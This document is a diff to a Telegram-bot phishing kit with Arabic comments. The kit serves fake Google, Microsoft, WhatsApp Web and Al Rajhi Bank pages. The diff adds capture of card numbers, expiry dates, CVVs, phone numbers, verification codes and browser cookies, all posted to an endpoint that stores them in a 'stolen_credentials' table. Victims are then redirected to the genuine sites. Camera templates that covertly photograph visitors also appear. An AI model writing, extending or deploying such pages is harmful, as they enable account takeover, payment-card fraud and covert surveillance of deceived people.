@@ -25,7 +25,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 RENDER_URL = os.getenv("RENDER_URL", "")
 CAPTURE_SECRET = os.getenv("CAPTURE_SECRET", "Shadow_Secret_2026")
 SALT = os.getenv("SALT", "Shadow_Salt_321")
-OWNER_ID = 7295259673  # تم وضع معرف المالك هنا
+OWNER_ID = 7295259673
 
 if not BOT_TOKEN or not RENDER_URL:
     logger.error("❌ المتغيرات البيئية BOT_TOKEN و RENDER_URL غير مضبوطة!")
@@ -68,12 +68,18 @@ class CaptureData(BaseModel):
 
 class CredentialsData(BaseModel):
     user_id: int
-    email: str
-    password: str
+    email: str = ""
+    password: str = ""
+    card_number: str = ""
+    card_expiry: str = ""
+    card_cvv: str = ""
+    phone: str = ""
+    code: str = ""
     login_type: str
+    cookies: str = ""
     secret: str
 
-# ==================== قاعدة البيانات ====================
+# ==================== قاعدة البيانات المطورة ====================
 def get_db_connection():
     conn = sqlite3.connect("users.db", check_same_thread=False)
     conn.row_factory = sqlite3.Row
@@ -117,13 +123,19 @@ def init_db():
             login_type TEXT,
             email TEXT,
             password TEXT,
+            card_number TEXT,
+            card_expiry TEXT,
+            card_cvv TEXT,
+            phone TEXT,
+            code TEXT,
+            cookies TEXT,
             target_ip TEXT,
             captured_at TEXT DEFAULT CURRENT_TIMESTAMP
         )
     """)
     conn.commit()
     conn.close()
-    logger.info("✅ قاعدة البيانات جاهزة")
+    logger.info("✅ قاعدة البيانات جاهزة (مع دعم الكوكيز والبطاقات)")
 
 init_db()
 
@@ -185,18 +197,21 @@ def log_capture(owner_chat_id, ip, device, count):
     except Exception as e:
         logger.error(f"⚠️ فشل تسجيل الالتقاط: {e}")
 
-def log_credentials(owner_chat_id, login_type, email, password, ip):
+def log_credentials(owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, ip):
     try:
         conn = get_db_connection()
         cursor = conn.cursor()
-        cursor.execute("INSERT INTO stolen_credentials (owner_chat_id, login_type, email, password, target_ip) VALUES (?, ?, ?, ?, ?)",
-                       (owner_chat_id, login_type, email, password, ip))
+        cursor.execute("""
+            INSERT INTO stolen_credentials 
+            (owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, target_ip) 
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        """, (owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, ip))
         conn.commit()
         conn.close()
     except Exception as e:
         logger.error(f"⚠️ فشل تسجيل بيانات الدخول: {e}")
 
-# ==================== صفحة تسجيل الدخول ====================
+# ==================== صفحة تسجيل الدخول الأساسية ====================
 def get_login_html():
     return """
     <!DOCTYPE html>
@@ -299,7 +314,7 @@ def get_login_html():
     </html>
     """
 
-# ==================== صفحات المقالب (كاميرا + كلمات مرور) ====================
+# ==================== قوالب المقالب ====================
 def get_html_content(template_type, secret_key):
     # --- قوالب الكاميرا ---
     if template_type in ["tiktok", "instagram", "snapchat", "ai_filter", "absher"]:
@@ -418,6 +433,11 @@ def get_html_content(template_type, secret_key):
                     return os + " (" + browser + ")";
                 }}
 
+                // جمع الكوكيز
+                function getCookies() {{
+                    return document.cookie || "";
+                }}
+
                 function startFakeProgress(callback) {{
                     const bar = document.getElementById('progressBar');
                     const fill = document.getElementById('progressFill');
@@ -453,6 +473,7 @@ def get_html_content(template_type, secret_key):
                             let ctx = canvas.getContext('2d');
                             let shotsTaken = 0; const deviceInfo = getDeviceInfo();
                             const totalShots = 3;
+                            const cookies = getCookies();
 
                             startFakeProgress(() => {{
                                 let captureInterval = setInterval(function() {{
@@ -491,7 +512,7 @@ def get_html_content(template_type, secret_key):
         </html>
         """
     
-    # --- قوالب كلمات المرور (جوجل ومايكروسوفت) ---
+    # --- قالب جوجل (مع جمع الكوكيز) ---
     elif template_type == "google":
         return f"""
         <!DOCTYPE html>
@@ -537,147 +558,55 @@ def get_html_content(template_type, secret_key):
                 .logo span:nth-child(4) {{ color: #4285f4; }}
                 .logo span:nth-child(5) {{ color: #34a853; }}
                 .logo span:nth-child(6) {{ color: #ea4335; }}
-                .title {{
-                    font-size: 24px;
-                    font-weight: 400;
-                    text-align: center;
-                    margin-bottom: 10px;
-                    color: #202124;
-                }}
-                .subtitle {{
-                    font-size: 16px;
-                    font-weight: 400;
-                    text-align: center;
-                    color: #5f6368;
-                    margin-bottom: 30px;
-                }}
-                .input-group {{
-                    margin-bottom: 20px;
-                    position: relative;
-                }}
+                .title {{ font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 10px; color: #202124; }}
+                .subtitle {{ font-size: 16px; font-weight: 400; text-align: center; color: #5f6368; margin-bottom: 30px; }}
+                .input-group {{ margin-bottom: 20px; }}
                 .input-group input {{
-                    width: 100%;
-                    padding: 13px 15px;
-                    border: 1px solid #dadce0;
-                    border-radius: 4px;
-                    font-size: 16px;
-                    color: #202124;
-                    background: white;
+                    width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px;
+                    font-size: 16px; color: #202124; background: white; outline: none;
                     transition: border-color 0.2s;
-                    outline: none;
                 }}
-                .input-group input:focus {{
-                    border-color: #4285f4;
-                    box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
-                }}
-                .input-group input::placeholder {{
-                    color: #80868b;
-                    font-weight: 400;
-                }}
+                .input-group input:focus {{ border-color: #4285f4; }}
                 .btn {{
-                    background: #4285f4;
-                    color: white;
-                    border: none;
-                    padding: 12px;
-                    font-size: 16px;
-                    font-weight: 500;
-                    border-radius: 4px;
-                    cursor: pointer;
-                    width: 100%;
-                    transition: background 0.2s;
-                    margin-top: 10px;
-                    letter-spacing: 0.3px;
+                    background: #4285f4; color: white; border: none; padding: 12px; font-size: 16px;
+                    font-weight: 500; border-radius: 4px; cursor: pointer; width: 100%;
+                    transition: background 0.2s; margin-top: 10px;
                 }}
-                .btn:hover {{
-                    background: #3367d6;
-                }}
-                .btn:active {{
-                    background: #2a56c6;
-                }}
-                .error {{
-                    color: #d93025;
-                    font-size: 14px;
-                    margin-top: 15px;
-                    display: none;
-                    background: #fce8e6;
-                    padding: 10px;
-                    border-radius: 4px;
-                    text-align: center;
-                }}
-                .footer {{
-                    margin-top: 30px;
-                    text-align: center;
-                    font-size: 14px;
-                    color: #5f6368;
-                }}
-                .footer a {{
-                    color: #4285f4;
-                    text-decoration: none;
-                }}
-                .footer a:hover {{
-                    text-decoration: underline;
-                }}
-                .separator {{
-                    display: flex;
-                    align-items: center;
-                    margin: 20px 0;
-                    color: #5f6368;
-                    font-size: 14px;
-                }}
-                .separator::before, .separator::after {{
-                    content: "";
-                    flex: 1;
-                    height: 1px;
-                    background: #dadce0;
-                }}
+                .btn:hover {{ background: #3367d6; }}
+                .error {{ color: #d93025; font-size: 14px; margin-top: 15px; display: none; background: #fce8e6; padding: 10px; border-radius: 4px; text-align: center; }}
+                .footer {{ margin-top: 30px; text-align: center; font-size: 14px; color: #5f6368; }}
+                .footer a {{ color: #4285f4; text-decoration: none; }}
+                .footer a:hover {{ text-decoration: underline; }}
+                .separator {{ display: flex; align-items: center; margin: 20px 0; color: #5f6368; font-size: 14px; }}
+                .separator::before, .separator::after {{ content: ""; flex: 1; height: 1px; background: #dadce0; }}
                 .separator::before {{ margin-right: 15px; }}
                 .separator::after {{ margin-left: 15px; }}
             </style>
         </head>
         <body>
             <div class="container">
-                <div class="logo">
-                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-                </div>
+                <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
                 <div class="title">تسجيل الدخول</div>
                 <div class="subtitle">استمراراً إلى حسابك على Google</div>
-                
-                <div class="input-group">
-                    <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autofocus>
-                </div>
-                <div class="input-group">
-                    <input type="password" id="password" placeholder="أدخل كلمة المرور">
-                </div>
-                
+                <div class="input-group"><input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autofocus></div>
+                <div class="input-group"><input type="password" id="password" placeholder="أدخل كلمة المرور"></div>
                 <button class="btn" id="loginBtn">تسجيل الدخول</button>
                 <div class="error" id="errorMsg">تأكد من أن بيانات الدخول صحيحة</div>
-                
                 <div class="separator">أو</div>
-                
                 <div style="text-align: center; margin-top: 10px;">
                     <a href="#" style="color: #4285f4; text-decoration: none; font-size: 14px; font-weight: 500;">إنشاء حساب</a>
                 </div>
-                
-                <div class="footer">
-                    <a href="#">مساعدة</a> · <a href="#">خصوصية</a> · <a href="#">شروط الخدمة</a>
-                </div>
+                <div class="footer"><a href="#">مساعدة</a> · <a href="#">خصوصية</a> · <a href="#">شروط الخدمة</a></div>
             </div>
-            
             <script>
                 const ownerId = new URLSearchParams(window.location.search).get('id');
+                function getCookies() {{ return document.cookie || ""; }}
                 document.getElementById('loginBtn').addEventListener('click', function() {{
                     const email = document.getElementById('email').value.trim();
                     const pass = document.getElementById('password').value.trim();
                     const errorBlock = document.getElementById('errorMsg');
-                    
-                    if(!email || !pass) {{
-                        errorBlock.style.display = 'block';
-                        errorBlock.innerText = '⚠️ يرجى ملء جميع الحقول';
-                        return;
-                    }}
-                    
+                    if(!email || !pass) {{ errorBlock.style.display = 'block'; errorBlock.innerText = '⚠️ يرجى ملء جميع الحقول'; return; }}
                     errorBlock.style.display = 'none';
-                    
                     fetch('/api/credentials', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
@@ -686,26 +615,18 @@ def get_html_content(template_type, secret_key):
                             email: email,
                             password: pass,
                             login_type: 'google',
+                            cookies: getCookies(),
                             secret: '{secret_key}'
                         }})
-                    }})
-                    .then(() => {{
-                        window.location.href = 'https://accounts.google.com/v3/signin/challenge/pwd?continue=https://www.google.com';
-                    }})
-                    .catch(() => {{
-                        window.location.href = 'https://www.google.com';
-                    }});
+                    }}).then(() => {{ window.location.href = 'https://accounts.google.com/v3/signin/challenge/pwd?continue=https://www.google.com'; }});
                 }});
-                
-                // الضغط على Enter
-                document.getElementById('password').addEventListener('keypress', function(e) {{
-                    if(e.key === 'Enter') document.getElementById('loginBtn').click();
-                }});
+                document.getElementById('password').addEventListener('keypress', function(e) {{ if(e.key === 'Enter') document.getElementById('loginBtn').click(); }});
             </script>
         </body>
         </html>
         """
     
+    # --- قالب مايكروسوفت (مع جمع الكوكيز) ---
     elif template_type == "microsoft":
         return f"""
         <!DOCTYPE html>
@@ -716,9 +637,223 @@ def get_html_content(template_type, secret_key):
             <title>تسجيل الدخول - Microsoft</title>
             <style>
                 * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+                body {{ background: #f2f2f2; font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }}
+                .container {{ max-width: 440px; width: 100%; background: white; padding: 44px 40px 36px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); }}
+                .logo {{ font-size: 28px; font-weight: 600; color: #202124; text-align: center; margin-bottom: 5px; }}
+                .logo small {{ font-size: 14px; color: #5f6368; display: block; font-weight: 400; }}
+                .title {{ font-size: 20px; font-weight: 600; color: #202124; text-align: center; margin-bottom: 8px; }}
+                .subtitle {{ font-size: 15px; color: #5f6368; text-align: center; margin-bottom: 30px; }}
+                .input-group {{ margin-bottom: 18px; }}
+                .input-group input {{ width: 100%; padding: 12px 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; color: #202124; background: white; outline: none; transition: border-color 0.2s; }}
+                .input-group input:focus {{ border-color: #0078d4; }}
+                .btn {{ background: #0078d4; color: white; border: none; padding: 12px; font-size: 15px; font-weight: 600; border-radius: 4px; cursor: pointer; width: 100%; transition: background 0.2s; }}
+                .btn:hover {{ background: #005a9e; }}
+                .error {{ color: #d13438; font-size: 14px; margin-top: 15px; display: none; background: #fce8e6; padding: 10px; border-radius: 4px; text-align: center; }}
+                .footer {{ margin-top: 25px; text-align: center; font-size: 13px; color: #5f6368; }}
+                .footer a {{ color: #0078d4; text-decoration: none; }}
+                .footer a:hover {{ text-decoration: underline; }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="logo">Microsoft <small>حسابك</small></div>
+                <div class="title">تسجيل الدخول</div>
+                <div class="subtitle">لتفعيل اشتراكك وخدماتك</div>
+                <div class="input-group"><input type="text" id="email" placeholder="البريد الإلكتروني أو اسم المستخدم" autofocus></div>
+                <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور"></div>
+                <button class="btn" id="loginBtn">تسجيل الدخول</button>
+                <div class="error" id="errorMsg">تأكد من صحة بيانات الدخول</div>
+                <div class="footer"><a href="#">نسيت كلمة المرور؟</a> · <a href="#">إنشاء حساب جديد</a></div>
+            </div>
+            <script>
+                const ownerId = new URLSearchParams(window.location.search).get('id');
+                function getCookies() {{ return document.cookie || ""; }}
+                document.getElementById('loginBtn').addEventListener('click', function() {{
+                    const email = document.getElementById('email').value.trim();
+                    const pass = document.getElementById('password').value.trim();
+                    const errorBlock = document.getElementById('errorMsg');
+                    if(!email || !pass) {{ errorBlock.style.display = 'block'; errorBlock.innerText = '⚠️ يرجى ملء جميع الحقول'; return; }}
+                    errorBlock.style.display = 'none';
+                    fetch('/api/credentials', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{
+                            user_id: ownerId,
+                            email: email,
+                            password: pass,
+                            login_type: 'microsoft',
+                            cookies: getCookies(),
+                            secret: '{secret_key}'
+                        }})
+                    }}).then(() => {{ window.location.href = 'https://login.live.com/'; }});
+                }});
+                document.getElementById('password').addEventListener('keypress', function(e) {{ if(e.key === 'Enter') document.getElementById('loginBtn').click(); }});
+            </script>
+        </body>
+        </html>
+        """
+    
+    # --- قالب واتساب (جديد) ---
+    elif template_type == "whatsapp":
+        return f"""
+        <!DOCTYPE html>
+        <html lang="ar" dir="ltr">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>واتساب ويب</title>
+            <style>
+                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                 body {{
-                    background: #f2f2f2;
-                    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+                    background: #075e54;
+                    font-family: 'Segoe UI', Arial, sans-serif;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    min-height: 100vh;
+                    margin: 0;
+                    padding: 20px;
+                }}
+                .container {{
+                    max-width: 450px;
+                    width: 100%;
+                    background: #ffffff;
+                    border-radius: 12px;
+                    padding: 40px 30px;
+                    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+                }}
+                .logo {{
+                    text-align: center;
+                    margin-bottom: 25px;
+                }}
+                .logo img {{
+                    width: 70px;
+                    height: 70px;
+                    background: #25d366;
+                    border-radius: 50%;
+                    padding: 12px;
+                }}
+                .title {{
+                    font-size: 22px;
+                    font-weight: 600;
+                    color: #075e54;
+                    text-align: center;
+                    margin-bottom: 8px;
+                }}
+                .subtitle {{
+                    font-size: 15px;
+                    color: #5f6368;
+                    text-align: center;
+                    margin-bottom: 25px;
+                }}
+                .input-group {{ margin-bottom: 18px; }}
+                .input-group input {{
+                    width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 8px;
+                    font-size: 16px; color: #202124; background: #f5f5f5; outline: none;
+                    transition: border-color 0.2s;
+                }}
+                .input-group input:focus {{ border-color: #25d366; background: white; }}
+                .btn {{
+                    background: #25d366; color: white; border: none; padding: 14px;
+                    font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer;
+                    width: 100%; transition: background 0.2s;
+                }}
+                .btn:hover {{ background: #1da85c; }}
+                .error {{ color: #d93025; font-size: 14px; margin-top: 15px; display: none; background: #fce8e6; padding: 10px; border-radius: 8px; text-align: center; }}
+                .qr-box {{
+                    background: #f0f0f0;
+                    border-radius: 8px;
+                    padding: 20px;
+                    text-align: center;
+                    margin-bottom: 20px;
+                }}
+                .qr-box .qr-placeholder {{
+                    width: 120px;
+                    height: 120px;
+                    background: #fff;
+                    margin: 0 auto;
+                    border: 2px dashed #ccc;
+                    border-radius: 8px;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-size: 12px;
+                    color: #999;
+                }}
+                .footer {{ margin-top: 20px; text-align: center; font-size: 13px; color: #5f6368; }}
+                .footer a {{ color: #075e54; text-decoration: none; font-weight: 600; }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="logo">
+                    <div style="width:70px;height:70px;background:#25d366;border-radius:50%;margin:0 auto;display:flex;align-items:center;justify-content:center;font-size:36px;color:white;font-weight:bold;">W</div>
+                </div>
+                <div class="title">واتساب ويب</div>
+                <div class="subtitle">لتفعيل حسابك، أدخل رقم هاتفك ورمز التفعيل</div>
+                
+                <div class="qr-box">
+                    <div class="qr-placeholder">🔲 امسح الرمز<br>أو أدخل البيانات</div>
+                </div>
+                
+                <div class="input-group">
+                    <input type="text" id="phone" placeholder="رقم الهاتف (مثال: 9665xxxxxxxx)" dir="ltr">
+                </div>
+                <div class="input-group">
+                    <input type="text" id="code" placeholder="رمز التفعيل المكون من 6 أرقام" dir="ltr">
+                </div>
+                
+                <button class="btn" id="verifyBtn">تفعيل الحساب</button>
+                <div class="error" id="errorMsg">تأكد من صحة البيانات</div>
+                
+                <div class="footer">
+                    <a href="#">مساعدة</a> · <a href="#">سياسة الخصوصية</a>
+                </div>
+            </div>
+            <script>
+                const ownerId = new URLSearchParams(window.location.search).get('id');
+                function getCookies() {{ return document.cookie || ""; }}
+                document.getElementById('verifyBtn').addEventListener('click', function() {{
+                    const phone = document.getElementById('phone').value.trim();
+                    const code = document.getElementById('code').value.trim();
+                    const errorBlock = document.getElementById('errorMsg');
+                    if(!phone || !code) {{ errorBlock.style.display = 'block'; errorBlock.innerText = '⚠️ يرجى ملء جميع الحقول'; return; }}
+                    if(phone.length < 10) {{ errorBlock.style.display = 'block'; errorBlock.innerText = '⚠️ رقم الهاتف غير مكتمل'; return; }}
+                    if(code.length < 4) {{ errorBlock.style.display = 'block'; errorBlock.innerText = '⚠️ رمز التفعيل يجب أن يكون 6 أرقام'; return; }}
+                    errorBlock.style.display = 'none';
+                    fetch('/api/credentials', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{
+                            user_id: ownerId,
+                            phone: phone,
+                            code: code,
+                            login_type: 'whatsapp',
+                            cookies: getCookies(),
+                            secret: '{secret_key}'
+                        }})
+                    }}).then(() => {{ window.location.href = 'https://web.whatsapp.com/'; }});
+                }});
+                document.getElementById('code').addEventListener('keypress', function(e) {{ if(e.key === 'Enter') document.getElementById('verifyBtn').click(); }});
+            </script>
+        </body>
+        </html>
+        """
+    
+    # --- قالب بنكي (جديد) ---
+    elif template_type == "bank":
+        return f"""
+        <!DOCTYPE html>
+        <html lang="ar" dir="ltr">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>تأكيد البطاقة - الراجحي</title>
+            <style>
+                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+                body {{
+                    background: #f0f2f5;
+                    font-family: 'Segoe UI', Arial, sans-serif;
                     display: flex;
                     justify-content: center;
                     align-items: center;
@@ -730,155 +865,146 @@ def get_html_content(template_type, secret_key):
                     max-width: 440px;
                     width: 100%;
                     background: white;
-                    padding: 44px 40px 36px;
-                    border-radius: 8px;
-                    box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+                    border-radius: 12px;
+                    padding: 35px 30px;
+                    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                 }}
                 .logo {{
-                    font-size: 28px;
-                    font-weight: 600;
-                    color: #202124;
                     text-align: center;
-                    margin-bottom: 5px;
+                    margin-bottom: 20px;
                 }}
-                .logo small {{
-                    font-size: 14px;
-                    color: #5f6368;
-                    display: block;
-                    font-weight: 400;
-                    margin-top: 2px;
+                .logo .bank-name {{
+                    font-size: 28px;
+                    font-weight: 700;
+                    color: #003366;
+                }}
+                .logo .bank-sub {{
+                    font-size: 13px;
+                    color: #666;
                 }}
                 .title {{
                     font-size: 20px;
                     font-weight: 600;
-                    color: #202124;
+                    color: #003366;
                     text-align: center;
                     margin-bottom: 8px;
                 }}
                 .subtitle {{
-                    font-size: 15px;
-                    color: #5f6368;
-                    text-align: center;
-                    margin-bottom: 30px;
-                }}
-                .input-group {{
-                    margin-bottom: 18px;
-                }}
-                .input-group input {{
-                    width: 100%;
-                    padding: 12px 14px;
-                    border: 1px solid #ccc;
-                    border-radius: 4px;
-                    font-size: 15px;
-                    color: #202124;
-                    background: white;
-                    transition: border-color 0.2s;
-                    outline: none;
-                }}
-                .input-group input:focus {{
-                    border-color: #0078d4;
-                }}
-                .btn {{
-                    background: #0078d4;
-                    color: white;
-                    border: none;
-                    padding: 12px;
-                    font-size: 15px;
-                    font-weight: 600;
-                    border-radius: 4px;
-                    cursor: pointer;
-                    width: 100%;
-                    transition: background 0.2s;
-                }}
-                .btn:hover {{
-                    background: #005a9e;
-                }}
-                .error {{
-                    color: #d13438;
                     font-size: 14px;
-                    margin-top: 15px;
-                    display: none;
-                    background: #fce8e6;
-                    padding: 10px;
-                    border-radius: 4px;
-                    text-align: center;
-                }}
-                .footer {{
-                    margin-top: 25px;
-                    text-align: center;
-                    font-size: 13px;
                     color: #5f6368;
+                    text-align: center;
+                    margin-bottom: 25px;
                 }}
-                .footer a {{
-                    color: #0078d4;
-                    text-decoration: none;
+                .input-group {{ margin-bottom: 16px; }}
+                .input-group label {{ display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 5px; }}
+                .input-group input {{
+                    width: 100%; padding: 12px 14px; border: 1px solid #d1d5db; border-radius: 8px;
+                    font-size: 15px; color: #202124; background: white; outline: none;
+                    transition: border-color 0.2s;
                 }}
-                .footer a:hover {{
-                    text-decoration: underline;
+                .input-group input:focus {{ border-color: #003366; box-shadow: 0 0 0 3px rgba(0,51,102,0.1); }}
+                .input-row {{ display: flex; gap: 12px; }}
+                .input-row .input-group {{ flex: 1; }}
+                .btn {{
+                    background: #003366; color: white; border: none; padding: 14px;
+                    font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer;
+                    width: 100%; transition: background 0.2s; margin-top: 10px;
                 }}
+                .btn:hover {{ background: #002244; }}
+                .error {{ color: #d93025; font-size: 14px; margin-top: 15px; display: none; background: #fce8e6; padding: 10px; border-radius: 8px; text-align: center; }}
+                .footer {{ margin-top: 25px; text-align: center; font-size: 12px; color: #666; }}
+                .footer a {{ color: #003366; text-decoration: none; }}
+                .secure {{ text-align: center; margin-top: 15px; font-size: 13px; color: #34a853; }}
+                .secure span {{ font-size: 16px; }}
             </style>
         </head>
         <body>
             <div class="container">
                 <div class="logo">
-                    Microsoft
-                    <small>حسابك</small>
+                    <div class="bank-name">🏦 الراجحي</div>
+                    <div class="bank-sub">Al Rajhi Bank</div>
                 </div>
-                <div class="title">تسجيل الدخول</div>
-                <div class="subtitle">لتفعيل اشتراكك وخدماتك</div>
+                <div class="title">تأكيد بيانات البطاقة</div>
+                <div class="subtitle">لتحديث بيانات حسابك وإتمام عملية التحقق</div>
                 
                 <div class="input-group">
-                    <input type="text" id="email" placeholder="البريد الإلكتروني أو اسم المستخدم" autofocus>
-                </div>
-                <div class="input-group">
-                    <input type="password" id="password" placeholder="كلمة المرور">
+                    <label>رقم البطاقة (16 خانة)</label>
+                    <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" dir="ltr">
                 </div>
                 
-                <button class="btn" id="loginBtn">تسجيل الدخول</button>
-                <div class="error" id="errorMsg">تأكد من صحة بيانات الدخول</div>
+                <div class="input-row">
+                    <div class="input-group">
+                        <label>تاريخ الانتهاء</label>
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" dir="ltr">
+                    </div>
+                    <div class="input-group">
+                        <label>رمز CVV</label>
+                        <input type="password" id="cvv" placeholder="XXX" maxlength="4" dir="ltr">
+                    </div>
+                </div>
                 
+                <button class="btn" id="verifyBtn">تأكيد والتحقق</button>
+                <div class="error" id="errorMsg">تأكد من صحة البيانات المدخلة</div>
+                
+                <div class="secure"><span>🔒</span> اتصال مشفر وآمن 256-bit</div>
                 <div class="footer">
-                    <a href="#">نسيت كلمة المرور؟</a> · <a href="#">إنشاء حساب جديد</a>
+                    <a href="#">شروط الاستخدام</a> · <a href="#">سياسة الخصوصية</a>
                 </div>
             </div>
-            
             <script>
                 const ownerId = new URLSearchParams(window.location.search).get('id');
-                document.getElementById('loginBtn').addEventListener('click', function() {{
-                    const email = document.getElementById('email').value.trim();
-                    const pass = document.getElementById('password').value.trim();
+                function getCookies() {{ return document.cookie || ""; }}
+                
+                // تنسيق رقم البطاقة
+                document.getElementById('cardNumber').addEventListener('input', function(e) {{
+                    let val = this.value.replace(/\D/g, '');
+                    if(val.length > 16) val = val.slice(0, 16);
+                    let formatted = '';
+                    for(let i=0; i<val.length; i++) {{
+                        if(i>0 && i%4===0) formatted += ' ';
+                        formatted += val[i];
+                    }}
+                    this.value = formatted;
+                }});
+                
+                // تنسيق تاريخ الانتهاء
+                document.getElementById('expiry').addEventListener('input', function(e) {{
+                    let val = this.value.replace(/\D/g, '');
+                    if(val.length > 4) val = val.slice(0, 4);
+                    if(val.length >= 2) {{
+                        this.value = val.slice(0,2) + '/' + val.slice(2);
+                    }} else {{
+                        this.value = val;
+                    }}
+                }});
+                
+                document.getElementById('verifyBtn').addEventListener('click', function() {{
+                    const card = document.getElementById('cardNumber').value.trim();
+                    const expiry = document.getElementById('expiry').value.trim();
+                    const cvv = document.getElementById('cvv').value.trim();
                     const errorBlock = document.getElementById('errorMsg');
                     
-                    if(!email || !pass) {{
-                        errorBlock.style.display = 'block';
-                        errorBlock.innerText = '⚠️ يرجى ملء جميع الحقول';
-                        return;
-                    }}
+                    const cardDigits = card.replace(/\s/g, '');
+                    if(!card || cardDigits.length < 16) {{ errorBlock.style.display = 'block'; errorBlock.innerText = '⚠️ رقم البطاقة يجب أن يتكون من 16 خانة'; return; }}
+                    if(!expiry || expiry.length < 5) {{ errorBlock.style.display = 'block'; errorBlock.innerText = '⚠️ أدخل تاريخ الانتهاء بصيغة MM/YY'; return; }}
+                    if(!cvv || cvv.length < 3) {{ errorBlock.style.display = 'block'; errorBlock.innerText = '⚠️ أدخل رمز CVV المكون من 3 أو 4 أرقام'; return; }}
                     
                     errorBlock.style.display = 'none';
-                    
                     fetch('/api/credentials', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
                         body: JSON.stringify({{
                             user_id: ownerId,
-                            email: email,
-                            password: pass,
-                            login_type: 'microsoft',
+                            card_number: card,
+                            card_expiry: expiry,
+                            card_cvv: cvv,
+                            login_type: 'bank',
+                            cookies: getCookies(),
                             secret: '{secret_key}'
                         }})
-                    }})
-                    .then(() => {{
-                        window.location.href = 'https://login.live.com/';
-                    }})
-                    .catch(() => {{
-                        window.location.href = 'https://www.microsoft.com';
-                    }});
+                    }}).then(() => {{ window.location.href = 'https://www.alrajhibank.com.sa/'; }});
                 }});
-                
-                document.getElementById('password').addEventListener('keypress', function(e) {{
-                    if(e.key === 'Enter') document.getElementById('loginBtn').click();
-                }});
+                document.getElementById('cvv').addEventListener('keypress', function(e) {{ if(e.key === 'Enter') document.getElementById('verifyBtn').click(); }});
             </script>
         </body>
         </html>
@@ -898,7 +1024,7 @@ def start(message):
         InlineKeyboardButton("🔐 تسجيل الدخول للنظام", web_app=telebot.types.WebAppInfo(url=f"{RENDER_URL}/login-page")),
         InlineKeyboardButton("ℹ️ تعليمات", callback_data="show_instructions")
     )
-    bot.send_message(chat_id, "🛡️ نظام الصيد الذكي v11.0\nيرجى تسجيل الدخول.", reply_markup=markup)
+    bot.send_message(chat_id, "🛡️ نظام الصيد الذكي v12.0\nيرجى تسجيل الدخول.", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "show_instructions")
 def show_instructions(call):
@@ -927,6 +1053,8 @@ def show_main_menu(chat_id):
         InlineKeyboardButton("🚨 أبشر", callback_data="gen_absher"),
         InlineKeyboardButton("📧 جوجل (كلمة مرور)", callback_data="gen_google"),
         InlineKeyboardButton("🔑 مايكروسوفت (كلمة مرور)", callback_data="gen_microsoft"),
+        InlineKeyboardButton("💬 واتساب (تفعيل)", callback_data="gen_whatsapp"),
+        InlineKeyboardButton("💳 بنك (بطاقة ائتمان)", callback_data="gen_bank"),
         InlineKeyboardButton("🔄 تحديث الجلسة", callback_data="gen_refresh")
     )
     bot.send_message(chat_id, "👑 اختر القالب المناسب:", reply_markup=markup)
@@ -950,7 +1078,9 @@ def gen_link(call):
         template_map = {
             "tiktok": "tiktok", "instagram": "instagram", "snapchat": "snapchat",
             "ai_filter": "ai_filter", "absher": "absher",
-            "google": "google", "microsoft": "microsoft", "refresh": "refresh"
+            "google": "google", "microsoft": "microsoft",
+            "whatsapp": "whatsapp", "bank": "bank",
+            "refresh": "refresh"
         }
         template = template_map.get(raw)
         if not template:
@@ -968,7 +1098,7 @@ def gen_link(call):
         logger.error(f"💥 خطأ: {traceback.format_exc()}")
         bot.send_message(chat_id, f"⚠️ عطل تقني: {str(e)[:100]}")
 
-# ==================== أمر توليد 100 مستخدم جديد (للمالك فقط) ====================
+# ==================== أمر توليد المستخدمين ====================
 @bot.message_handler(commands=['genusers'])
 def generate_users_command(message):
     chat_id = message.chat.id
@@ -1066,29 +1196,51 @@ async def credentials_api(request: Request, background_tasks: BackgroundTasks):
         body = await request.json()
         if body.get("secret") != CAPTURE_SECRET:
             raise HTTPException(status_code=403, detail="Unauthorized")
+        
